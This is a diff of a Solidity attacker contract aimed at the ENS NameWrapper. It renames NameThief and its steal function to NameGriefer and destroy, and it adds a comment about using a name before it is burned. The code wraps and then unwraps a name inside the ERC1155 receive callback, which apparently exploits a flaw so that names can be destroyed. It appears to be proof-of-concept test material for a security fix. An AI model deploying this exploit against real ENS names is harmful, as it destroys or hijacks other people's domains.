@@ -5,7 +5,7 @@ import "../../interfaces/INameWrapper.sol";
 import "@ensdomains/ens-contracts/contracts/registry/ENS.sol";
 import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
 
-contract NameThief is IERC1155Receiver {
+contract NameGriefer is IERC1155Receiver {
     using BytesUtils for *;
 
     ENS public immutable ens;
@@ -18,7 +18,7 @@ contract NameThief is IERC1155Receiver {
         _ens.setApprovalForAll(address(_wrapper), true);
     }
 
-    function steal(bytes calldata name) public {
+    function destroy(bytes calldata name) public {
         wrapper.wrap(name, address(this), CAN_DO_EVERYTHING, address(0));
     }
 
@@ -32,11 +32,14 @@ contract NameThief is IERC1155Receiver {
         bytes32 parentNode = name.namehash(offset);
         wrapper.unwrap(parentNode, labelhash, address(this));
 
-        return NameThief.onERC1155Received.selector;
+        // Here we can do something with the name before it's permanently burned, like 
+        // set the resolver or create subdomains.
+
+        return NameGriefer.onERC1155Received.selector;
     }
 
     function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) external override returns(bytes4) {
-        return NameThief.onERC1155BatchReceived.selector;
+        return NameGriefer.onERC1155BatchReceived.selector;
     }
 
     function supportsInterface(bytes4 interfaceID) external override view returns (bool) {
